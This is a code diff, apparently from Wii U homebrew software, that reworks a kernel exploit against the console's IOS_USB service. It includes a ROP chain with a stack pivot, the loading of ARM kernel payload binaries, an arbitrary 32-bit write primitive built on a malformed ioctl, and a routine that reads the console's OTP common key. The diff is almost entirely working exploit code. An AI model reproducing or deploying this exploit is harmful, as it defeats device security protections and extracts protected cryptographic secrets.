@@ -313,38 +313,38 @@ int second_chain[] = {
    0x1012EA68, // 0xAC         stack pivot
 };
 
-void uhs_exploit_init() {
-   ayylmao[5] = 1;
-   ayylmao[8] = 0x500000;
+static uint8_t otp_common_key[16] = { 0x00 };
+static int request_buffer[2] = { -(0xBEA2C), 0 };
 
-   OSBlockMove((void *)0xF4120000, second_chain, sizeof(second_chain), false);
-   OSBlockMove((void *)0xF4130000, final_chain, sizeof(final_chain), false);
-   OSBlockMove((void *)0xF4140000, arm_kernel_bin, sizeof(arm_kernel_bin), false);
-   OSBlockMove((void *)0xF4148000, arm_user_bin, sizeof(arm_user_bin), false);
+static inline void uhs_exploit_init()
+{
+	ayylmao[5] = 1;
+	ayylmao[8] = 0x500000;
 
-   pretend_root_hub[33] = 0x500000;
-   pretend_root_hub[78] = 0;
+	OSBlockMove((void *)0xF4120000, second_chain, sizeof(second_chain), false);
+	OSBlockMove((void *)0xF4130000, final_chain, sizeof(final_chain), false);
+	OSBlockMove((void *)0xF4140000, arm_kernel_bin, sizeof(arm_kernel_bin), false);
+	OSBlockMove((void *)0xF4148000, arm_user_bin, sizeof(arm_user_bin), false);
 
-   DCFlushRange(pretend_root_hub + 33, 200);      //! |Make CPU fetch new data (with updated vals)
-   DCInvalidateRange(pretend_root_hub + 33, 200);   //! |for "pretend_root_hub"
-   
-   DCFlushRange((void *)0xF4120000, sizeof(second_chain));      //! |Make CPU fetch new data (with updated vals)
-   DCFlushRange((void *)0xF4130000, sizeof(final_chain));      //! |Make CPU fetch new data (with updated vals)
-   DCFlushRange((void *)0xF4140000, sizeof(arm_kernel_bin));      //! |Make CPU fetch new data (with updated vals)
-   DCFlushRange((void *)0xF4148000, sizeof(arm_user_bin));      //! |Make CPU fetch new data (with updated vals)
+	pretend_root_hub[33] = 0x500000;
+	pretend_root_hub[78] = 0;
+
+	DCFlushRange(pretend_root_hub + 33, 200);		//! |Make CPU fetch new data (with updated vals)
+	DCInvalidateRange(pretend_root_hub + 33, 200);	//! |for "pretend_root_hub"
+
+	DCFlushRange((void *)0xF4120000, 0xF4148000 - 0xF4120000 + sizeof(arm_user_bin));	//! |Make CPU fetch new data (with updated vals)
 }
 
-int uhs_write32(int arm_addr, int val, int uhs) {
-   ayylmao[520] = arm_addr - 24;                  //!  The address to be overwritten, minus 24 bytes
-   DCFlushRange(ayylmao, 521 * 4);                //! |Make CPU fetch new data (with updated adress)
-   DCInvalidateRange(ayylmao, 521 * 4);           //! |for "ayylmao"
-   OSSleepTicks(0x200000);                        //!  Improves stability
-   int request_buffer[] = { -(0xBEA2C), val };      //! -(0xBEA2C) gets IOS_USB to read from the middle of MEM1
-   int output_buffer[32];
-   return IOS_Ioctl(uhs, 0x15, request_buffer, sizeof(request_buffer), output_buffer, sizeof(output_buffer));
+static int uhs_write32(int arm_addr, int val, int uhs)
+{
+	ayylmao[520] = arm_addr - 24;			//!  The address to be overwritten, minus 24 bytes
+	DCFlushRange(ayylmao, 521 * 4);			//! |Make CPU fetch new data (with updated adress)
+	DCInvalidateRange(ayylmao, 521 * 4);	//! |for "ayylmao"
+	OSSleepTicks(0x200000);					//!  Improves stability
+	request_buffer[1] = val;				//! -(0xBEA2C) gets IOS_USB to read from the middle of MEM1
+	int output_buffer[32];
+	return IOS_Ioctl(uhs, 0x15, request_buffer, sizeof(request_buffer), output_buffer, sizeof(output_buffer));
 }
-
-uint8_t otp_common_key[16] = { 0x00 };
 
 uint8_t *getCommonKey()
 {
@@ -364,7 +364,6 @@ uint8_t *getCommonKey()
 		OSBlockMove(&otp_common_key[0], armHackAddr, 16, false);
 		
 		IOS_Close(uhs);
-		OSSleepTicks(0x400000);
 		
 #ifdef NUSSPLI_DEBUG
 		char ret[33];
